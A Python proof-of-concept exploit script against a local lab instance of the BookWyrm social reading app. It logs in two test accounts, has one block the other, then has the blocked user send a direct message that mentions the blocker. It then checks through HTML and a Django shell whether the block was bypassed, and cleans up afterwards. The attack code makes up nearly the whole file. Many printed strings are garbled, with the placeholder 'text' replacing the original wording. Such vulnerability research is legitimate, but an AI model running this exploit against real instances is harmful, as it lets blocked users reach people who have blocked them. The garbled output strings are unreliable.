                      
""

import sys
import subprocess
import requests
from bs4 import BeautifulSoup

REPO_PATH    = "/home/ground/Desktop/BAC/cve-app/bookwyrm/bookwyrm"
COMPOSE_FILE = f"{REPO_PATH}/docker-compose.yml"
COMPOSE_OVR  = f"{REPO_PATH}/docker-compose.override.yml"

CONFIG = {
    "base_url": "http://192.168.115.88:8800",
    "userA_username":  "usera",
    "userA_password":  "userApass1",
    "userA_localname": "usera",
    "userB_username":  "userb",
    "userB_password":  "userBpass1",
    "userB_localname": "userb",
    "message": "@usera text，textYestext！textSuccess。",
}


def run_shell(code):
    ""
    cmd = [
        "docker", "compose",
        "-f", COMPOSE_FILE, "-f", COMPOSE_OVR,
        "exec", "-T", "web",
        "python", "manage.py", "shell", "-c", code,
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=REPO_PATH)
    return [l for l in result.stdout.splitlines()
            if l.strip() and "warning" not in l.lower() and "warn" not in l.lower()]


def get_csrf(session, url):
    resp = session.get(url)
    resp.raise_for_status()
    token = session.cookies.get("csrftoken")
    if not token:
        soup = BeautifulSoup(resp.text, "html.parser")
        tag = soup.find("input", {"name": "csrfmiddlewaretoken"})
        token = tag["value"] if tag else None
    return token


def login(session, base_url, username, password):
    ""
    login_url = f"{base_url}/login/"
    csrf = get_csrf(session, login_url)
    if not csrf:
        print(f"[ERROR] NonetextGettext CSRF Token")
        sys.exit(1)
    session.post(login_url, data={
        "csrfmiddlewaretoken": csrf,
        "localname": username,
        "password":  password,
    }, allow_redirects=True)
    if "sessionid" not in session.cookies:
        print(f"[ERROR] User {username} Login failed")
        sys.exit(1)
    print(f"[+] User {username} Login succeeded，sessionid={session.cookies['sessionid'][:16]}...")
    return get_csrf(session, base_url + "/")


def get_user_id(session, base_url, localname):
    ""
    profile_url = f"{base_url}/user/{localname}"
    resp = session.get(profile_url)
    if resp.status_code == 404:
        print(f"[ERROR] User {localname} text 404")
        sys.exit(1)
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, "html.parser")
    for tag in soup.find_all(True):
        for attr in ("action", "href"):
            val = tag.get(attr, "")
            for keyword in ("/block/", "/unblock/", "/report/"):
                if keyword in val:
                    candidate = val.strip("/").split("/")[-1]
                    if candidate.isdigit():
                        print(f"[+] text {localname} text ID = {candidate}（text {attr}={val}）")
                        return int(candidate)
    print(f"[ERROR] Nonetext {profile_url} text {localname} textUser ID")
    sys.exit(1)


def block_user(session, base_url, csrf, target_user_id):
    ""
    block_url = f"{base_url}/block/{target_user_id}/"
    payload = {"csrfmiddlewaretoken": csrf}
    resp = session.post(block_url, data=payload, allow_redirects=True)
    if resp.status_code in (200, 302):
        print(f"[+] UserA SuccesstextUser ID={target_user_id}（Responsetext：{resp.status_code}）")
    else:
        print(f"[!] textRequestReturntextExpectedStatustext：{resp.status_code}，text PoC...")


def unblock_user(session, base_url, csrf, target_user_id):
    ""
    unblock_url = f"{base_url}/unblock/{target_user_id}/"
    resp = session.post(unblock_url, data={"csrfmiddlewaretoken": csrf}, allow_redirects=True)
    if resp.status_code in (200, 302):
        print(f"[+] textUser ID={target_user_id} text（Responsetext：{resp.status_code}）")
    else:
        print(f"[!] unblock Responsetext：{resp.status_code}，Pleasetext")


def cleanup_poc_messages_db(message_keyword):
    ""
    lines = run_shell(f"""
from bookwyrm.models import Status
n, _ = Status.objects.filter(
    privacy='direct',
    content__contains='{message_keyword}'
).delete()
print(f'db_cleaned={{n}}')
""")
    cleaned = next((l for l in lines if l.startswith("db_cleaned=")), "")
    if cleaned:
        n = cleaned.split("=")[-1]
        if n != "0":
            print(f"[+] DB text {n} text")


def delete_direct_messages(session, base_url, csrf):
    ""
    dm_url = f"{base_url}/direct-messages/"
    resp = session.get(dm_url)
    soup = BeautifulSoup(resp.text, "html.parser")
    status_ids = []
    for tag in soup.find_all(True):
        for attr in ("action", "href"):
            val = tag.get(attr, "")
            if "/delete-status/" in val:
                sid = val.strip("/").split("/")[-1]
                if sid.isdigit() and sid not in status_ids:
                    status_ids.append(sid)
    if not status_ids:
        print("[*] text，NonetextDelete")
        return 0
    deleted = 0
    for sid in status_ids:
        del_csrf = session.cookies.get("csrftoken", csrf)
        del_resp = session.post(f"{base_url}/delete-status/{sid}",
                                data={"csrfmiddlewaretoken": del_csrf},
                                allow_redirects=False)
        if del_resp.status_code in (200, 302):
            print(f"[+] deletedtext status_id={sid}")
            deleted += 1
    return deleted


def send_direct_message(session, base_url, csrf, sender_user_id, message, sender_username):
    ""
    post_url = f"{base_url}/post/direct"
    payload = {
        "csrfmiddlewaretoken": csrf,
        "user":            sender_user_id,
        "content":         message,
        "content_warning": "",
        "privacy":         "direct",
    }
    print(f"\n[*] Step 5 — text：UserB（ID={sender_user_id}）text UserA Sendtext")
    print(f"    POST {post_url}")
    print(f"    textContent：{message}")
    resp = session.post(post_url, data=payload, allow_redirects=False)
    print(f"\n[*] textResponsetext：{resp.status_code}")
    if resp.status_code not in (200, 302):
        print(f"[?] textExpectedResponsetext {resp.status_code}，Pleasetext。")
    return resp.status_code


def check_mention_users(base_url, session_b, usera_localname, message_keyword):
    ""
                                                            
    dm_url = f"{base_url}/direct-messages/"
    resp = session_b.get(dm_url)
    mention_marker = f"/user/{usera_localname}"
    html_positive = (mention_marker in resp.text and message_keyword in resp.text)

                                                            
    lines = run_shell(f"""
from bookwyrm.models import Status, User
usera = User.objects.get(localname='{usera_localname}')
s = Status.objects.filter(
    privacy='direct', deleted=False,
    content__contains='{message_keyword}'
).order_by('-id').first()
if s is None:
    print('STATUS_NOT_FOUND')
elif usera in s.mention_users.all():
    print('MENTION_IN_DB')
else:
    print('MENTION_NOT_IN_DB')
""")
    db_verdict = next(
        (l for l in lines if l in ("MENTION_IN_DB", "MENTION_NOT_IN_DB", "STATUS_NOT_FOUND")),
        "UNKNOWN"
    )
    db_positive = (db_verdict == "MENTION_IN_DB")

                                                              
    if html_positive or db_positive:
        print("\n[!!! text !!!]")
        if html_positive:
            print(f"    [HTML layer] DM textExists @{usera_localname} text（textPath）。")
        if db_positive:
            print(f"    [DB layer]   mention_users text {usera_localname}（DBdirect DB confirmation，text return text）。")
        if not html_positive and db_positive:
            print(f"    Note：HTML  layertext（patch text return Skiptext save），")
            print(f"          text DB textHas mention text，text block text，")
            print(f"          text。")
        print("    text：CreateStatus.post()（bookwyrm/views/status.py）")
        print("          find_mentions() textCheck block text，text block text。")
        return True
    else:
        print("\n[✓ text]")
        print(f"    [HTML layer] DM textNone @{usera_localname} text。")
        print(f"    [DB layer]   mention_users None {usera_localname} text（{db_verdict}）。")
        print("    UserA text。")
        return False


def main():
    base = CONFIG["base_url"]
    print("=" * 60)
    print("  BookWyrm Nonetext CVE-1 — Block text PoC")
    print("  CWE-284: Improper Access Control")
    print("  text：<= v0.4.5")
    print("=" * 60)

    print("\n[Step 1] UserA text...")
    session_a = requests.Session()
    csrf_a = login(session_a, base, CONFIG["userA_username"], CONFIG["userA_password"])

    print(f"\n[Step 1b] UserB text（text block textGet UserA text ID）...")
    session_b = requests.Session()
    csrf_b = login(session_b, base, CONFIG["userB_username"], CONFIG["userB_password"])

    print(f"\n[Step 2] text UserA Identitytext UserB（{CONFIG['userB_localname']}）textUser ID...")
    userb_id = get_user_id(session_a, base, CONFIG["userB_localname"])

    print(f"\n[Step 2b] text UserB Identitytext UserA（{CONFIG['userA_localname']}）textUser ID（text block textComplete）...")
    usera_id = get_user_id(session_b, base, CONFIG["userA_localname"])

    print(f"\n[Step 3] UserA text UserB（ID={userb_id}）...")
    csrf_a = get_csrf(session_a, base + "/")
    block_user(session_a, base, csrf_a, userb_id)

    print(f"\n[Step 4] text UserB text CSRF Token（Session textValid）...")
    csrf_b = get_csrf(session_b, base + "/")
    print(f"[+] UserB CSRF Token textSuccess")

    send_direct_message(session_b, base, csrf_b, userb_id,
                        CONFIG["message"], CONFIG["userB_username"])

    print(f"\n[Step 6] Check UserB text DM textYesNotext @UserA text mention...")
    check_mention_users(base, session_b, CONFIG["userA_localname"], "textSuccess")

    print("\n[Complete] PoC textEnd。")

    print("\n" + "─" * 60)
    print("[Teardown] text PoC text，textStatus...")
    csrf_a = get_csrf(session_a, base + "/")
    unblock_user(session_a, base, csrf_a, userb_id)
    csrf_a = get_csrf(session_a, base + "/")
    delete_direct_messages(session_a, base, csrf_a)
                                         
    cleanup_poc_messages_db("textSuccess")
    print("[Teardown] Complete，text PoC RuntextStatus。")
    print("─" * 60)


if __name__ == "__main__":
    main()
